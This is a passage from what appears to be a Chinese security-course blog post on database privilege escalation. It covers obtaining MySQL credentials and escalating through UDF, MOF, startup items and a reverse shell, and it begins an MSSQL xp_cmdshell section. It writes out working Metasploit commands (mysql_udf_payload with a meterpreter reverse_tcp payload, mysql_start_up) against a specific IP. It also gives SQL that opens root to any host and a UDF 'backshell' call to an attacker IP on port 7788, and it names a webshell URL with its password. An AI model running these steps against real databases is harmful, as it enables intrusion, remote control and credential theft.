short错误_kaip_TJU的博客-CSDN博客</a>，发现可能是这种文件放在windows上不兼容，下载下来有问题，猜测要放到linux服务器上下载，这个so文件是在liunx生成的，后面将原文件直接复制到了plugin目录下，执行成功如下</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421172415704.png" alt="image-20230421172415704"></p><h6 id="函数创建成功"><a href="#函数创建成功" class="headerlink" title="函数创建成功"></a>函数创建成功</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421172513868.png" alt="image-20230421172513868"></p><h3 id="提权条件-数据库帐号密码获取方式"><a href="#提权条件-数据库帐号密码获取方式" class="headerlink" title="#提权条件-数据库帐号密码获取方式"></a>#提权条件-数据库帐号密码获取方式</h3><h4 id="条件一：数据库的最高权限用户的密码"><a href="#条件一：数据库的最高权限用户的密码" class="headerlink" title="条件一：数据库的最高权限用户的密码"></a>条件一：数据库的最高权限用户的密码</h4><h4 id="条件二：secure-file-priv没进行目录限制"><a href="#条件二：secure-file-priv没进行目录限制" class="headerlink" title="条件二：secure-file-priv没进行目录限制"></a>条件二：secure-file-priv没进行目录限制</h4><blockquote><h4 id="如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my-ini文件编辑，在末尾加入secure-file-priv-x3D-，Mysql添加secure-file-prive值-追得上的梦想-博客园-cnblogs-com-，但是前提是加入后MYSQL服务得重启才有效果"><a href="#如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my-ini文件编辑，在末尾加入secure-file-priv-x3D-，Mysql添加secure-file-prive值-追得上的梦想-博客园-cnblogs-com-，但是前提是加入后MYSQL服务得重启才有效果" class="headerlink" title="如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my.ini文件编辑，在末尾加入secure_file_priv&#x3D;，Mysql添加secure_file_prive值 - 追得上的梦想 - 博客园 (cnblogs.com)，但是前提是加入后MYSQL服务得重启才有效果"></a>如果没有开启secure-file-priv，那么进入MYSQL安装目录下，打开my.ini文件编辑，在末尾加入secure_file_priv&#x3D;，<a href="https://www.cnblogs.com/KHZ521/p/14066258.html">Mysql添加secure_file_prive值 - 追得上的梦想 - 博客园 (cnblogs.com)</a>，但是前提是加入后MYSQL服务得重启才有效果</h4></blockquote><h5 id="1、网站存在高权限SQL注入点"><a href="#1、网站存在高权限SQL注入点" class="headerlink" title="1、网站存在高权限SQL注入点"></a>1、网站存在高权限SQL注入点</h5><h5 id="2、数据库的存储文件或备份文件"><a href="#2、数据库的存储文件或备份文件" class="headerlink" title="2、数据库的存储文件或备份文件"></a>2、数据库的存储文件或备份文件</h5><h5 id="3、网站应用源码中的数据库配置文件"><a href="#3、网站应用源码中的数据库配置文件" class="headerlink" title="3、网站应用源码中的数据库配置文件"></a>3、网站应用源码中的数据库配置文件</h5><h5 id="4、采用工具或脚本爆破-需解决外联问题"><a href="#4、采用工具或脚本爆破-需解决外联问题" class="headerlink" title="4、采用工具或脚本爆破(需解决外联问题)"></a>4、采用工具或脚本爆破(需解决外联问题)</h5><h6 id="如果存在注入点，用sqlmap爆破密码"><a href="#如果存在注入点，用sqlmap爆破密码" class="headerlink" title="如果存在注入点，用sqlmap爆破密码"></a>如果存在注入点，用sqlmap爆破密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104545651.png" alt="image-20230419104545651"></p><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104644625.png" alt="image-20230419104644625"></p><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104710312.png" alt="image-20230419104710312"></p><h6 id="如果获取了网站权限，通过数据库的这几个文件中，一般是user-MYD文件，下载下来"><a href="#如果获取了网站权限，通过数据库的这几个文件中，一般是user-MYD文件，下载下来" class="headerlink" title="如果获取了网站权限，通过数据库的这几个文件中，一般是user.MYD文件，下载下来"></a>如果获取了网站权限，通过数据库的这几个文件中，一般是user.MYD文件，下载下来</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104149953.png" alt="image-20230419104149953"></p><h6 id="打开这个文件，可以看到加密后的密码，MD5网站解密即可"><a href="#打开这个文件，可以看到加密后的密码，MD5网站解密即可" class="headerlink" title="打开这个文件，可以看到加密后的密码，MD5网站解密即可"></a>打开这个文件，可以看到加密后的密码，MD5网站解密即可</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104224588.png" alt="image-20230419104224588"></p><h6 id="还可以查看配置文件"><a href="#还可以查看配置文件" class="headerlink" title="还可以查看配置文件"></a>还可以查看配置文件</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104843766.png" alt="image-20230419104843766"></p><h6 id="打开就可以看到用户密码"><a href="#打开就可以看到用户密码" class="headerlink" title="打开就可以看到用户密码"></a>打开就可以看到用户密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104901451.png" alt="image-20230419104901451"></p><h4 id="MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell"><a href="#MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell" class="headerlink" title="#MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell"></a>#MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell</h4><p><a href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】 - FreeBuf网络安全行业门户</a></p><h4 id="4种方法"><a href="#4种方法" class="headerlink" title="4种方法"></a>4种方法</h4><h4 id="都建立在数据库开启了写入文件的功能上，即secure-file-priv开启"><a href="#都建立在数据库开启了写入文件的功能上，即secure-file-priv开启" class="headerlink" title="都建立在数据库开启了写入文件的功能上，即secure-file-priv开启"></a>都建立在数据库开启了写入文件的功能上，即secure-file-priv开启</h4><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114724609.png" alt="image-20230419114724609"></p><h5 id="方法1、UDF"><a href="#方法1、UDF" class="headerlink" title="方法1、UDF"></a>方法1、UDF</h5><h6 id="获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续"><a href="#获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续" class="headerlink" title="获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续"></a>获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续</h6><ul><li><h6 id="mysql-lt-5-2-导出目录c-x2F-windows或system32"><a href="#mysql-lt-5-2-导出目录c-x2F-windows或system32" class="headerlink" title="mysql&lt;5.2 导出目录c:&#x2F;windows或system32"></a>mysql&lt;5.2 导出目录c:&#x2F;windows或system32</h6></li><li><h6 id="mysql-x3D-gt-5-2-导出安装目录-x2F-lib-x2F-plugin-x2F"><a href="#mysql-x3D-gt-5-2-导出安装目录-x2F-lib-x2F-plugin-x2F" class="headerlink" title="mysql&#x3D;&gt;5.2 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;"></a>mysql&#x3D;&gt;5.2 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;</h6></li><li><p>查看版本：select version()   查看安装目录：select @@basedir</p></li><li><p>开启数据库外连：</p><p><code>GRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;password&#39; WITH GRANT OPTION;</code></p><p><code>FLUSH PRIVILEGES;（刷新）</code></p></li><li><p>关闭数据库外连：</p><p><code>UPDATE mysql.user SET Host=&#39;localhost&#39; WHERE User=&#39;root&#39; AND Host=&#39;%&#39;;</code><br><code>FLUSH PRIVILEGES;（刷新</code>）</p></li><li><p><a href="https://www.cnblogs.com/zzjdbk/p/12992355.html">开启mysql外部访问(root外连) - My_Dreams - 博客园 (cnblogs.com)</a></p></li><li><p>没有目录采用手工创建plugin目录或利用NTFS流创建 </p></li><li><p>使用MSF中的exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload 模块可以进行UDF提权,</p></li><li><p>MSF会将dll文件写入lib\plugin\目录下(前提是该目录存在，需手工创建),该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。</p></li></ul><h6 id="用哥斯拉连接数据库-因为木马在其本地，所以可以连接数据库"><a href="#用哥斯拉连接数据库-因为木马在其本地，所以可以连接数据库" class="headerlink" title="用哥斯拉连接数据库(因为木马在其本地，所以可以连接数据库)"></a>用哥斯拉连接数据库(因为木马在其本地，所以可以连接数据库)</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230420013644140.png" alt="image-20230420013644140"></p><h6 id="但是外部软件尝试连接，会拒绝，原因是没有开启外连"><a href="#但是外部软件尝试连接，会拒绝，原因是没有开启外连" class="headerlink" title="但是外部软件尝试连接，会拒绝，原因是没有开启外连"></a>但是外部软件尝试连接，会拒绝，原因是没有开启外连</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230420013821125.png" alt="image-20230420013821125"></p><h6 id="先判断数据库的版本"><a href="#先判断数据库的版本" class="headerlink" title="先判断数据库的版本"></a>先判断数据库的版本</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105424511.png" alt="image-20230419105424511"></p><h6 id="用sql语句查看安装目录"><a href="#用sql语句查看安装目录" class="headerlink" title="用sql语句查看安装目录"></a>用sql语句查看安装目录</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105520677.png" alt="image-20230419105520677"></p><h6 id="然后进入这个lib-x2F-plugin目录-没有目录采用手工创建plugin-然后msf进行利用"><a href="#然后进入这个lib-x2F-plugin目录-没有目录采用手工创建plugin-然后msf进行利用" class="headerlink" title="然后进入这个lib&#x2F;plugin目录,没有目录采用手工创建plugin,然后msf进行利用"></a>然后进入这个lib&#x2F;plugin目录,没有目录采用手工创建plugin,然后msf进行利用</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105625537.png" alt="image-20230419105625537"></p><h5 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h5><h5 id="先MSF-（前提先开外链）"><a href="#先MSF-（前提先开外链）" class="headerlink" title="先MSF:（前提先开外链）"></a>先MSF:（前提先开外链）</h5><ul><li><h6 id="这里是用msf在lib-x2F-plugin目录自动生成dll文件，也可以手工创建dll文件然后上传"><a href="#这里是用msf在lib-x2F-plugin目录自动生成dll文件，也可以手工创建dll文件然后上传" class="headerlink" title="这里是用msf在lib&#x2F;plugin目录自动生成dll文件，也可以手工创建dll文件然后上传"></a>这里是用msf在lib&#x2F;plugin目录自动生成dll文件，也可以手工创建dll文件然后上传</h6></li><li><p>可能出现的问题及原因：</p></li><li><p><strong>1、</strong><a href="https://www.cnblogs.com/shanmao/p/12045560.html">Exploit completed, but no session was created. - 山貓 - 博客园 (cnblogs.com)</a></p></li><li><p><strong>2、</strong>msf创建的sys_exec()函数无回显，得创建sys_eval()才有回显：<a href="https://blog.csdn.net/qq_36119192/article/details/84863268">MySQL UDF提权执行系统命令_谢公子mysql提权_谢公子的博客-CSDN博客</a></p></li><li><p>常规执行如下：</p></li><li><p>use exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload</p></li><li><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p></li><li><p>set password root</p></li><li><p>set rhosts 47.102.195.100</p></li><li><p>run</p></li></ul><h5 id="接着Navicat实现"><a href="#接着Navicat实现" class="headerlink" title="接着Navicat实现:"></a>接着Navicat实现:</h5><ul><li><h6 id="（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）"><a href="#（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）" class="headerlink" title="（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）"></a>（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）</h6></li><li><p>手动可能出现的问题：<a href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】 - FreeBuf网络安全行业门户</a></p></li><li><p>开外联后使用MSF导出，在执行后续命令调用执行</p></li><li><p>select * from mysql.func where name &#x3D; “sys_exec”; &#x2F;&#x2F;查看</p></li><li><p>create function sys_eval returns string soname “IpKFJktF.dll”;&#x2F;&#x2F;创建函数绑定dll，linux里面是.so文件</p></li><li><p>select sys_eval(“whoami”);&#x2F;&#x2F;调用函数进行命令执行</p></li></ul><h6 id="演示上述："><a href="#演示上述：" class="headerlink" title="演示上述："></a>演示上述：</h6><h6 id="选择模块后show-options"><a href="#选择模块后show-options" class="headerlink" title="选择模块后show options"></a>选择模块后show options</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105839820.png" alt="image-20230419105839820"></p><h6 id="按照命令往下敲"><a href="#按照命令往下敲" class="headerlink" title="按照命令往下敲"></a>按照命令往下敲</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419110437759.png" alt="image-20230419110437759"></p><h6 id="这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下"><a href="#这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下" class="headerlink" title="这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下"></a>这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419110238004.png" alt="image-20230419110238004"></p><h6 id="执行完后发现有个-，这表明任意主机都可以连接这个数据库"><a href="#执行完后发现有个-，这表明任意主机都可以连接这个数据库" class="headerlink" title="执行完后发现有个%，这表明任意主机都可以连接这个数据库"></a>执行完后发现有个%，这表明任意主机都可以连接这个数据库</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419110318452.png" alt="image-20230419110318452"></p><h6 id="然后run"><a href="#然后run" class="headerlink" title="然后run"></a>然后run</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419111222983.png" alt="image-20230419111222983"></p><h6 id="随后会在目录下产生一个dll文件"><a href="#随后会在目录下产生一个dll文件" class="headerlink" title="随后会在目录下产生一个dll文件"></a>随后会在目录下产生一个dll文件</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421003605333.png" alt="image-20230421003605333"></p><h6 id="也可以通过sql查询找到sys-exec和这个dll文件绑定了，可以通过sys-exec来执行命令"><a href="#也可以通过sql查询找到sys-exec和这个dll文件绑定了，可以通过sys-exec来执行命令" class="headerlink" title="也可以通过sql查询找到sys_exec和这个dll文件绑定了，可以通过sys_exec来执行命令"></a>也可以通过sql查询找到sys_exec和这个dll文件绑定了，可以通过sys_exec来执行命令</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421003918467.png" alt="image-20230421003918467"></p><h6 id="但是用sys-exec来-执行命令，会没有回显，只会显示数字"><a href="#但是用sys-exec来-执行命令，会没有回显，只会显示数字" class="headerlink" title="但是用sys_exec来 执行命令，会没有回显，只会显示数字"></a>但是用sys_exec来 执行命令，会没有回显，只会显示数字</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421003010588.png" alt="image-20230421003010588"></p><h6 id="所以这里用Navicat先连接数据库-或者哥斯拉直接执行-，将这个sys-eval也绑定这个dll文件，因为sys-eval有回显"><a href="#所以这里用Navicat先连接数据库-或者哥斯拉直接执行-，将这个sys-eval也绑定这个dll文件，因为sys-eval有回显" class="headerlink" title="所以这里用Navicat先连接数据库(或者哥斯拉直接执行)，将这个sys_eval也绑定这个dll文件，因为sys_eval有回显"></a>所以这里用Navicat先连接数据库(或者哥斯拉直接执行)，将这个sys_eval也绑定这个dll文件，因为sys_eval有回显</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421084408478.png" alt="image-20230421084408478"></p><h6 id="现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线"><a href="#现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线" class="headerlink" title="现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线"></a>现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419112019984.png" alt="image-20230419112019984"></p><h5 id="方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）"><a href="#方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）" class="headerlink" title="方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）"></a>方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）</h5><p>参考：<a href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a></p><p>MSF：use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_mof</p><h5 id="方法3、启动项"><a href="#方法3、启动项" class="headerlink" title="方法3、启动项"></a>方法3、启动项</h5><p>MSF：（前提先开外链）</p><p>use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up</p><p>set rhosts 47.102.195.100</p><p>set username root</p><p>set password root</p><p>run</p><h6 id="一开始启动目录为空"><a href="#一开始启动目录为空" class="headerlink" title="一开始启动目录为空"></a>一开始启动目录为空</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419113058689.png" alt="image-20230419113058689"></p><h6 id="执行上面的msf命令后在启动项生成了一个exe木马"><a href="#执行上面的msf命令后在启动项生成了一个exe木马" class="headerlink" title="执行上面的msf命令后在启动项生成了一个exe木马"></a>执行上面的msf命令后在启动项生成了一个exe木马</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419113224884.png" alt="image-20230419113224884"></p><h6 id="如下，因为是启动项，所以要在其启动的时候才会执行上线"><a href="#如下，因为是启动项，所以要在其启动的时候才会执行上线" class="headerlink" title="如下，因为是启动项，所以要在其启动的时候才会执行上线"></a>如下，因为是启动项，所以要在其启动的时候才会执行上线</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419113242356.png" alt="image-20230419113242356"></p><h5 id="方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）"><a href="#方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）" class="headerlink" title="方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）"></a>方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）</h5><p>参考资料：<a href="https://blog.csdn.net/weixin_43801718/article/details/105493042">Mysql提权之反弹shell_mysql反弹shell_周雄雄的博客-CSDN博客</a></p><ul><li>use mysql;</li><li>set @a&#x3D;concat(‘’,</li><li>create table Ghost(data LONGBLOB);</li><li>insert into Ghost values(“”);update Ghost set data &#x3D; @a;（values双引号里面填payload语句如下，可在上面的链接中复制）</li><li>select data from Ghost into DUMPFILE ‘C:\phpstudy\PHPTutorial\MySQL\lib\plugin\udf.dll’;</li><li>create function backshell returns string soname ‘udf.dll’;</li><li>select backshell(‘攻击机ip’,7788)</li></ul><h6 id="将上面的sql语句执行"><a href="#将上面的sql语句执行" class="headerlink" title="将上面的sql语句执行"></a>将上面的sql语句执行</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114334282.png" alt="image-20230419114334282"></p><h6 id="攻击机上面监听7788端口，收到shell反弹"><a href="#攻击机上面监听7788端口，收到shell反弹" class="headerlink" title="攻击机上面监听7788端口，收到shell反弹"></a>攻击机上面监听7788端口，收到shell反弹</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114308571.png" alt="image-20230419114308571"></p><h6 id="可以看到生成了udf-dll文件"><a href="#可以看到生成了udf-dll文件" class="headerlink" title="可以看到生成了udf.dll文件"></a>可以看到生成了udf.dll文件</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114422784.png" alt="image-20230419114422784"></p><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><h6 id="上面的操作都需要secure-file-priv开启，如果子啊my-ini文件里面将其删除，如下"><a href="#上面的操作都需要secure-file-priv开启，如果子啊my-ini文件里面将其删除，如下" class="headerlink" title="上面的操作都需要secure_file_priv开启，如果子啊my.ini文件里面将其删除，如下"></a>上面的操作都需要secure_file_priv开启，如果子啊my.ini文件里面将其删除，如下</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419115033927.png" alt="image-20230419115033927"></p><h6 id="再次写入文件时，将会失败"><a href="#再次写入文件时，将会失败" class="headerlink" title="再次写入文件时，将会失败"></a>再次写入文件时，将会失败</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419115142477.png" alt="image-20230419115142477"></p><h3 id="MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒"><a href="#MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒" class="headerlink" title="#MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒"></a>#MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</h3><p>已知Shell：<a href="http://192.168.46.147:82/cd.aspx">http://192.168.46.147:82/cd.aspx</a> 密码x</p><p>参考资料：<a href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客</a></p><h5 id="1-使用xp-cmdshell进行提权"><a href="#1-使用xp-cmdshell进行提权" class="headerlink" title="1.使用xp_cmdshell进行提权"></a>1.使用xp_cmdshell进行提权</h5><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419140838630.png" alt="image-20230419140838630"></p><p>这个也可以进行命令执行</p><p><img 